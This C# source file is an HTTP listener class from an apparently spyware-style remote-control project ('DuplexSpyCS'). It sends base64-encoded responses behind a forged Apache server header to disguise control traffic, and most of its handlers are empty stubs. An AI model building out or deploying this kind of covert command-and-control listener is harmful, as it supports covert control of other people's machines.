using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;

namespace DuplexSpyCS
{
    public class clsHttpListener : clsListener
    {
        private Queue<clsHttpResp> m_qResponse = new Queue<clsHttpResp>();
        private TcpListener m_listener { get; set; }

        public clsHttpListener(string szName, int nPort, string szDescription)
        {
            m_szName = szName;
            m_nPort = nPort;
            m_szDescription = szDescription;
            m_protocol = enListenerProtocol.HTTP;

            m_listener = new TcpListener(IPAddress.Any, nPort);

            m_bIslistening = false;
        }

        public class clsHttpResp
        {
            private string szBody { get; init; }

            public clsHttpResp(string szMsg)
            {
                szBody = szMsg;
            }

            public byte[] fnGetBytes()
            {
                string szBody = clsCrypto.b64E2Str(this.szBody);
                string szResp = $"" +
                    $"HTTP/1.1 200 OK\r\n" +
                    $"Server: Apache/1.3.27\r\n" +
                    $"Content-Type: text/html\r\n" +
                    $"content-length: {szBody.Length}\r\n\r\n" +
                    $"{szBody}";

                return Encoding.UTF8.GetBytes(szResp);
            }
        }

        ~clsHttpListener() => fnStop();

        public override void fnStart()
        {
            if (m_bIslistening)
                return;

            Socket sktSrv = m_listener.Server;
            var hSafe = sktSrv.SafeHandle;
            if (sktSrv == null || hSafe == null || hSafe.IsInvalid || hSafe.IsClosed)
            {
                m_listener = null;
                m_listener = new TcpListener(IPAddress.Any, m_nPort);
            }

            m_listener.Start();
            m_listener.BeginAcceptTcpClient(new AsyncCallback(fnAcceptCallback), m_listener);

            m_bIslistening = true;
        }

        public override void fnStop()
        {
            if (!m_bIslistening)
                return;

            m_bIslistening = false;
        }

        public void fnEnqueue(byte[] abBuffer)
        {

        }

        public clsHttpResp fnGetResponse()
        {
            if (m_qResponse.Count == 0)
            {
                return new clsHttpResp(string.Empty);
            }
            else
            {
                return m_qResponse.Dequeue();
            }
        }

        public void fnReqHandler()
        {

        }

        private void fnAcceptCallback(IAsyncResult ar)
        {

        }
    }
}
